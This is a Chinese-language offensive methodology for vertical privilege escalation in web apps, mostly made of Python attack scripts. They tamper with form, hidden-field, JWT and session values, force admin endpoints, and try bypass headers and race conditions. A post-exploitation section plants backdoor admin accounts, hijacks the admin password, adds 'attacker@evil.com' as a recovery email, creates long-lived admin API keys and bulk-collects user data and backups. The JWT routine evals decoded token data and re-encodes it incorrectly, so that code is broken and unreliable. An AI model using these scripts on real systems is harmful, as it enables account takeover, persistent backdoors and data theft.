# 垂直权限提升攻击方法论

## 1. 技术概述

### 1.1 漏洞原理
垂直权限提升（Vertical Privilege Escalation）发生在以下场景：
- **客户端权限控制**：权限检查仅在客户端（JavaScript disabled 字段）实现
- **参数篡改可能**：用户可修改请求中的权限相关参数
- **缺少服务器端验证**：服务器未验证用户是否有权执行特权操作
- **自授权漏洞**：用户可以修改自己的权限级别

**本质**：低权限用户通过某种方式获取高权限用户的访问能力。

### 1.2 权限提升类型

| 类型 | 描述 | 典型场景 |
|-----|------|---------|
| **自提升** | 用户修改自己的权限 | 修改 is_admin=1 |
| **参数篡改** | 修改请求中的权限参数 | role=user→admin |
| **令牌提升** | 修改会话令牌中的权限 | JWT role 字段篡改 |
| **功能访问** | 直接访问管理员功能 | 访问/admin/*路径 |
| **工作流绕过** | 跳过权限检查步骤 | 绕过审批流程 |

### 1.3 攻击影响
- **完全系统接管**：获取管理员权限控制整个系统
- **敏感数据访问**：访问所有用户数据
- **特权操作执行**：执行删除、修改等关键操作
- **持久化后门**：创建管理员账户供后续使用

---

## 2. 攻击常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **个人资料编辑** | POST /edit_profile | 可修改 level、role 等权限字段 |
| **账户设置** | POST /account/settings | 可修改用户类型 |
| **权限申请** | POST /request-permission | 审批流程可绕过 |
| **功能切换** | POST /toggle-feature | 可启用管理员功能 |
| **API 密钥管理** | POST /api-keys/create | 可创建高权限 API 密钥 |
| **用户管理** | POST /users/update | 可修改其他用户权限 |
| **系统配置** | POST /system/config | 可修改系统配置 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 识别权限参数
```python
import requests
from bs4 import BeautifulSoup

def identify_permission_parameters(base_url, session):
    """识别与权限相关的参数"""
    
    permission_params = []
    
    # 获取个人资料页面
    profile_response = session.get(f"{base_url}/profile")
    
    if profile_response.status_code == 200:
        soup = BeautifulSoup(profile_response.text, 'html.parser')
        
        # 查找所有表单字段
        for input_tag in soup.find_all('input'):
            name = input_tag.get('name')
            value = input_tag.get('value', '')
            input_type = input_tag.get('type', 'text')
            
            # 检查是否是权限相关字段
            if any(keyword in name.lower() for keyword in [
                'role', 'level', 'admin', 'permission', 'privilege',
                'type', 'access', 'authority', 'is_'
            ]):
                permission_params.append({
                    'name': name,
                    'value': value,
                    'type': input_type,
                    'disabled': input_tag.has_attr('disabled')
                })
                print(f"✓ Found permission param: {name}={value} (disabled={input_tag.has_attr('disabled')})")
        
        # 检查 select 下拉框
        for select_tag in soup.find_all('select'):
            name = select_tag.get('name')
            if any(keyword in name.lower() for keyword in ['role', 'level', 'type']):
                options = [opt.get('value') for opt in select_tag.find_all('option')]
                permission_params.append({
                    'name': name,
                    'options': options,
                    'disabled': select_tag.has_attr('disabled')
                })
                print(f"✓ Found permission select: {name} with options {options}")
    
    return permission_params
```

#### 3.1.2 权限提升检测
```python
def test_privilege_escalation(base_url, session, escalation_tests):
    """
    测试权限提升漏洞
    
    escalation_tests: 包含参数和测试值的列表
    [
        {'param': 'is_admin', 'original': '0', 'test': '1'},
        {'param': 'role', 'original': 'user', 'test': 'admin'}
    ]
    """
    
    results = []
    
    for test in escalation_tests:
        param = test['param']
        test_value = test['test']
        
        # 构造请求
        data = {param: test_value}
        
        # 发送请求
        response = session.post(f"{base_url}/edit_profile", data=data)
        
        # 检查是否成功
        if response.status_code in [200, 204, 302]:
            # 验证权限是否提升
            if verify_privilege_escalated(session, base_url):
                results.append({
                    'param': param,
                    'test_value': test_value,
                    'success': True
                })
                print(f"✓ ESCALATION SUCCESSFUL: {param}={test_value}")
            else:
                print(f"? Request accepted but privilege not changed: {param}={test_value}")
        else:
            print(f"✗ Request rejected: {param}={test_value} ({response.status_code})")
    
    return results

def verify_privilege_escalated(session, base_url):
    """验证权限是否提升"""
    
    # 尝试访问管理员页面
    admin_response = session.get(f"{base_url}/admin/dashboard")
    if admin_response.status_code == 200:
        return True
    
    # 检查个人资料中的权限字段
    profile_response = session.get(f"{base_url}/api/me/profile")
    if profile_response.status_code == 200:
        try:
            data = profile_response.json()
            if data.get('is_admin') or data.get('role') == 'admin':
                return True
        except:
            pass
    
    return False
```

#### 3.1.3 管理员功能探测
```python
def probe_admin_functions(base_url, session):
    """探测可访问的管理员功能"""
    
    admin_paths = [
        "/admin",
        "/admin/dashboard",
        "/admin/users",
        "/admin/settings",
        "/admin/logs",
        "/api/admin/users",
        "/api/admin/config",
        "/management",
        "/console",
        "/administrator"
    ]
    
    accessible = []
    
    for path in admin_paths:
        response = session.get(f"{base_url}{path}")
        
        if response.status_code == 200:
            accessible.append(path)
            print(f"✓ ACCESSIBLE: {path}")
        elif response.status_code == 403:
            print(f"✗ Protected (403): {path}")
        elif response.status_code == 404:
            print(f"? Not found: {path}")
        elif response.status_code == 302:
            # 重定向到登录，说明存在但需要认证
            print(f"? Exists but requires auth: {path}")
    
    return accessible
```

### 3.2 白盒测试

#### 3.2.1 源代码审计
```bash
# 搜索权限检查模式
grep -rn "is_admin\|role.*==\|level.*==" --include="*.py"

# 搜索缺少权限验证的端点
grep -rn "@app.post\|@app.put" --include="*.py" -A 10 | grep -v "if.*admin\|check_permission\|verify_role"

# 搜索直接接受权限参数
grep -rn "Form.*admin\|Form.*role\|Form.*level" --include="*.py"

# 搜索权限字段更新
grep -rn "\.role\s*=\|\.level\s*=\|\.is_admin\s*=" --include="*.py"
```

#### 3.2.2 权限逻辑分析
```python
def analyze_privilege_logic(source_file):
    """分析源代码中的权限逻辑"""
    
    with open(source_file, 'r') as f:
        code = f.read()
    
    import re
    
    issues = []
    
    # 查找接受权限参数的端点
    patterns = [
        r'level:\s*(?:Optional\()?bool(?:\))?\s*=\s*Form\(([^)]+)\)',
        r'role:\s*str\s*=\s*Form\(([^)]+)\)',
        r'is_admin:\s*(?:Optional\()?bool(?:\))?\s*=\s*Form\(([^)]+)\)',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, code)
        
        for match in matches:
            # 检查是否有权限验证
            if 'admin' in match or 'check' not in code:
                issues.append({
                    'pattern': pattern,
                    'match': match,
                    'issue': 'Permission parameter accepted without verification'
                })
    
    # 查找直接更新权限字段的代码
    update_patterns = [
        r'company\.level\s*=\s*level',
        r'user\.role\s*=\s*role',
        r'user\.is_admin\s*=\s*is_admin',
    ]
    
    for pattern in update_patterns:
        if re.search(pattern, code):
            # 检查是否有授权检查
            if 'if.*admin' not in code or 'if.*permission' not in code:
                issues.append({
                    'pattern': pattern,
                    'issue': 'Permission field updated without authorization check'
                })
    
    return issues
```

---

## 4. 漏洞利用方法

### 4.1 基础权限提升

#### 4.1.1 表单参数篡改
```python
def escalate_via_form_tampering(session, base_url, endpoint, permission_params):
    """
    通过篡改表单参数提升权限
    """
    
    results = []
    
    for param, test_value in permission_params.items():
        # 构造请求
        data = {param: test_value}
        
        # 发送请求
        response = session.post(f"{base_url}{endpoint}", data=data)
        
        if response.status_code in [200, 204, 302]:
            # 验证权限提升
            if verify_privilege_escalated(session, base_url):
                results.append({
                    'param': param,
                    'value': test_value,
                    'success': True
                })
                print(f"✓ Privilege escalated via {param}={test_value}")
    
    return results

# 使用示例
permission_params = {
    'level': '1',
    'is_admin': 'true',
    'role': 'admin',
    'user_type': 'premium',
    'privilege': '1'
}

escalate_via_form_tampering(session, base_url, "/edit_profile", permission_params)
```

#### 4.1.2 隐藏字段利用
```python
def exploit_hidden_fields(session, base_url, form_url):
    """
    利用隐藏字段进行权限提升
    """
    
    # 获取表单
    form_response = session.get(f"{base_url}{form_url}")
    soup = BeautifulSoup(form_response.text, 'html.parser')
    
    # 查找隐藏字段
    hidden_fields = {}
    for input_tag in soup.find_all('input', type='hidden'):
        name = input_tag.get('name')
        value = input_tag.get('value')
        
        # 检查是否是权限相关字段
        if any(keyword in name.lower() for keyword in ['role', 'level', 'admin', 'permission']):
            hidden_fields[name] = value
            print(f"Found hidden field: {name}={value}")
    
    # 篡改隐藏字段值
    tampered_fields = {}
    for name, value in hidden_fields.items():
        if value == '0':
            tampered_fields[name] = '1'
        elif value == 'user':
            tampered_fields[name] = 'admin'
        elif value == 'false':
            tampered_fields[name] = 'true'
        elif value == 'standard':
            tampered_fields[name] = 'premium'
    
    # 提交篡改后的表单
    if tampered_fields:
        response = session.post(f"{base_url}{form_url}", data=tampered_fields)
        
        if response.status_code in [200, 204, 302]:
            if verify_privilege_escalated(session, base_url):
                print(f"✓ Privilege escalated via hidden fields: {tampered_fields}")
                return True
    
    return False
```

### 4.2 令牌权限提升

#### 4.2.1 JWT 令牌篡改
```python
import jwt
import base64

def escalate_via_jwt_tampering(session, base_url, current_token):
    """
    通过篡改 JWT 令牌提升权限
    """
    
    # 解码当前令牌
    try:
        # 不安全解码（不验证签名）
        parts = current_token.split('.')
        payload_b64 = parts[1]
        
        # 添加填充
        payload_b64 += '=' * (4 - len(payload_b64) % 4)
        payload_json = base64.urlsafe_b64decode(payload_b64)
        payload = eval(payload_json.decode())
        
        print(f"Current payload: {payload}")
        
        # 篡改权限字段
        if 'role' in payload:
            payload['role'] = 'admin'
            print("Modified role to 'admin'")
        
        if 'is_admin' in payload:
            payload['is_admin'] = True
            print("Modified is_admin to True")
        
        if 'level' in payload:
            payload['level'] = 1
            print("Modified level to 1")
        
        if 'permissions' in payload:
            payload['permissions'] = ['admin', 'read', 'write', 'delete']
            print("Modified permissions to include 'admin'")
        
        # 重新编码
        new_payload_b64 = base64.urlsafe_b64encode(
            str(payload).encode()
        ).decode().rstrip('=')
        
        # 构造新令牌（尝试保持原签名）
        new_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"
        
        # 测试新令牌
        session.cookies.set('auth_token', new_token)
        
        if verify_privilege_escalated(session, base_url):
            print(f"✓ Privilege escalated via JWT tampering!")
            return new_token
        
    except Exception as e:
        print(f"JWT tampering failed: {e}")
    
    return None
```

#### 4.2.2 会话数据篡改
```python
def escalate_via_session_tampering(session, base_url):
    """
    通过篡改会话数据提升权限
    """
    
    # 获取当前会话数据
    current_session = dict(session.cookies)
    print(f"Current session: {current_session}")
    
    # 尝试修改会话中的权限字段
    for cookie_name, cookie_value in current_session.items():
        if 'session' in cookie_name.lower() or 'auth' in cookie_name.lower():
            # 尝试解码和修改
            try:
                # 如果是 base64 编码
                decoded = base64.b64decode(cookie_value + '==')
                print(f"Decoded {cookie_name}: {decoded}")
                
                # 尝试修改
                modified = decoded.replace(b'user', b'admin')
                modified_b64 = base64.b64encode(modified).decode().rstrip('=')
                
                # 设置新 cookie
                session.cookies.set(cookie_name, modified_b64)
                
                if verify_privilege_escalated(session, base_url):
                    print(f"✓ Privilege escalated via session tampering!")
                    return True
                    
            except Exception as e:
                print(f"Session tampering failed for {cookie_name}: {e}")
    
    return False
```

### 4.3 直接功能访问

#### 4.3.1 管理员端点直接访问
```python
def access_admin_endpoints_directly(session, base_url):
    """
    直接访问管理员端点
    """
    
    admin_endpoints = [
        ('GET', '/admin/dashboard'),
        ('GET', '/admin/users'),
        ('POST', '/admin/users/create'),
        ('POST', '/admin/users/delete'),
        ('GET', '/admin/settings'),
        ('POST', '/admin/settings/update'),
        ('GET', '/admin/logs'),
        ('GET', '/api/admin/config'),
    ]
    
    accessible = []
    
    for method, endpoint in admin_endpoints:
        url = f"{base_url}{endpoint}"
        
        if method == 'GET':
            response = session.get(url)
        else:
            response = session.post(url)
        
        if response.status_code == 200:
            accessible.append((method, endpoint))
            print(f"✓ ACCESSIBLE: {method} {endpoint}")
    
    return accessible
```

#### 4.3.2 特权操作执行
```python
def execute_privileged_operations(session, base_url):
    """
    执行特权操作
    """
    
    operations = []
    
    # 1. 创建管理员账户
    create_admin_response = session.post(f"{base_url}/admin/users", data={
        'username': 'backdoor_admin',
        'password': 'SecurePass123!',
        'email': 'attacker@evil.com',
        'role': 'admin'
    })
    
    if create_admin_response.status_code == 201:
        operations.append('create_admin_user')
        print("✓ Created backdoor admin user")
    
    # 2. 修改系统配置
    config_response = session.post(f"{base_url}/admin/settings", data={
        'allow_registration': 'true',
        'require_email_verification': 'false'
    })
    
    if config_response.status_code == 200:
        operations.append('modify_system_config')
        print("✓ Modified system configuration")
    
    # 3. 查看敏感日志
    logs_response = session.get(f"{base_url}/admin/logs")
    
    if logs_response.status_code == 200:
        operations.append('access_sensitive_logs')
        print("✓ Accessed sensitive logs")
    
    return operations
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过客户端验证

#### 5.1.1 绕过 disabled 字段
```python
def bypass_disabled_field_restriction(session, base_url, endpoint, field_name, target_value):
    """
    绕过 disabled 字段限制
    场景：HTML 中字段被 disabled，但服务器仍接受
    """
    
    # 直接发送包含该字段的请求（不通过表单）
    data = {field_name: target_value}
    
    # 添加其他必要字段
    necessary_fields = get_necessary_fields(session, base_url, endpoint)
    data.update(necessary_fields)
    
    response = session.post(f"{base_url}{endpoint}", data=data)
    
    if response.status_code in [200, 204, 302]:
        print(f"✓ Bypassed disabled field restriction: {field_name}={target_value}")
        return True
    
    return False

def get_necessary_fields(session, base_url, endpoint):
    """获取表单的必要字段"""
    response = session.get(f"{base_url}{endpoint}")
    soup = BeautifulSoup(response.text, 'html.parser')
    
    fields = {}
    for input_tag in soup.find_all('input'):
        name = input_tag.get('name')
        value = input_tag.get('value')
        if name and value:
            fields[name] = value
    
    return fields
```

#### 5.1.2 绕过 JavaScript 验证
```python
def bypass_js_validation(session, base_url, endpoint, data):
    """
    绕过 JavaScript 验证
    场景：JavaScript 阻止提交特定值，但服务器未验证
    """
    
    # 直接使用 requests 发送，绕过 JavaScript
    response = session.post(f"{base_url}{endpoint}", data=data)
    
    if response.status_code in [200, 204, 302]:
        print(f"✓ Bypassed JavaScript validation")
        return True
    
    return False
```

### 5.2 绕过服务器端检查

#### 5.2.1 绕过权限检查中间件
```python
def bypass_permission_middleware(session, base_url, endpoint, data):
    """
    尝试绕过权限检查中间件
    """
    
    # 方法 1：使用不同的 HTTP 方法
    methods_to_try = ['POST', 'PUT', 'PATCH']
    
    for method in methods_to_try:
        if method == 'POST':
            response = session.post(f"{base_url}{endpoint}", data=data)
        elif method == 'PUT':
            response = session.put(f"{base_url}{endpoint}", json=data)
        elif method == 'PATCH':
            response = session.patch(f"{base_url}{endpoint}", json=data)
        
        if response.status_code in [200, 204, 302]:
            if verify_privilege_escalated(session, base_url):
                print(f"✓ Bypassed permission check via {method}")
                return True
    
    # 方法 2：添加额外的请求头
    headers_to_try = [
        {'X-Override-Permission': 'true'},
        {'X-Admin-Request': 'true'},
        {'X-Bypass-Auth': 'true'},
    ]
    
    for headers in headers_to_try:
        response = session.post(f"{base_url}{endpoint}", data=data, headers=headers)
        
        if response.status_code in [200, 204, 302]:
            if verify_privilege_escalated(session, base_url):
                print(f"✓ Bypassed permission check via headers: {headers}")
                return True
    
    return False
```

#### 5.2.2 利用竞争条件
```python
def exploit_race_condition(session, base_url, endpoint, data, num_requests=5):
    """
    利用竞争条件绕过权限检查
    """
    
    import threading
    
    results = []
    lock = threading.Lock()
    
    def send_request():
        response = session.post(f"{base_url}{endpoint}", data=data)
        with lock:
            results.append(response.status_code)
    
    # 并发发送多个请求
    threads = []
    for _ in range(num_requests):
        t = threading.Thread(target=send_request)
        threads.append(t)
    
    # 同时启动所有线程
    for t in threads:
        t.start()
    
    # 等待所有线程完成
    for t in threads:
        t.join()
    
    # 检查结果
    if 200 in results or 204 in results:
        if verify_privilege_escalated(session, base_url):
            print(f"✓ Exploited race condition! Responses: {results}")
            return True
    
    return False
```

---

## 6. 后渗透利用

### 6.1 持久化访问
```python
def establish_persistent_access(session, base_url):
    """
    建立持久化访问
    """
    
    persistence_methods = []
    
    # 1. 创建备用管理员账户
    try:
        create_response = session.post(f"{base_url}/admin/users", data={
            'username': 'system_maintenance',
            'password': 'Maintenance@2024',
            'email': 'maintenance@target.com',
            'role': 'admin'
        })
        
        if create_response.status_code == 201:
            persistence_methods.append('backdoor_admin_user')
            print("✓ Created backdoor admin user: system_maintenance")
    except:
        pass
    
    # 2. 修改现有管理员密码
    try:
        password_response = session.post(f"{base_url}/admin/change-password", data={
            'user_id': '1',
            'new_password': 'NewAdmin@2024'
        })
        
        if password_response.status_code == 200:
            persistence_methods.append('admin_password_change')
            print("✓ Changed admin password")
    except:
        pass
    
    # 3. 添加备用邮箱
    try:
        email_response = session.post(f"{base_url}/admin/security", data={
            'backup_email': 'attacker@evil.com'
        })
        
        if email_response.status_code == 200:
            persistence_methods.append('backup_email')
            print("✓ Added backup email for password recovery")
    except:
        pass
    
    # 4. 创建长有效期 API 密钥
    try:
        api_key_response = session.post(f"{base_url}/api/api-keys", data={
            'name': 'backup_key',
            'permissions': 'admin',
            'expires_in': '365'  # 365 天
        })
        
        if api_key_response.status_code == 201:
            persistence_methods.append('long_lived_api_key')
            api_key = api_key_response.json().get('key')
            print(f"✓ Created long-lived API key: {api_key[:20]}...")
    except:
        pass
    
    return persistence_methods
```

### 6.2 数据收集
```python
def collect_sensitive_data(session, base_url):
    """
    收集敏感数据
    """
    
    collected = {}
    
    # 1. 所有用户列表
    users_response = session.get(f"{base_url}/admin/users")
    if users_response.status_code == 200:
        collected['users'] = users_response.text
        print("✓ Collected user list")
    
    # 2. 系统配置
    config_response = session.get(f"{base_url}/admin/config")
    if config_response.status_code == 200:
        collected['config'] = config_response.text
        print("✓ Collected system configuration")
    
    # 3. 审计日志
    logs_response = session.get(f"{base_url}/admin/logs")
    if logs_response.status_code == 200:
        collected['logs'] = logs_response.text
        print("✓ Collected audit logs")
    
    # 4. 数据库备份
    backup_response = session.get(f"{base_url}/admin/backup")
    if backup_response.status_code == 200:
        collected['backup'] = backup_response.text
        print("✓ Collected database backup")
    
    return collected
```

---

## 7. 常用 Payload 速查表

### 7.1 权限参数值

| 参数名 | 原始值 | 提升值 |
|-------|-------|-------|
| is_admin | 0/false | 1/true |
| role | user | admin |
| level | 0 | 1 |
| privilege | standard | premium/admin |
| user_type | regular | administrator |
| access_level | 1 | 99/100 |
| permissions | read | admin/write/delete |

### 7.2 常见管理员端点

| 端点 | 功能 |
|-----|------|
| /admin/dashboard | 管理员仪表板 |
| /admin/users | 用户管理 |
| /admin/settings | 系统设置 |
| /admin/logs | 审计日志 |
| /api/admin/config | 系统配置 |
| /management | 管理控制台 |

---

## 8. 参考资源

- [OWASP Access Control](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [PortSwigger - Privilege Escalation](https://portswigger.net/web-security/access-control/privilege-escalation)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
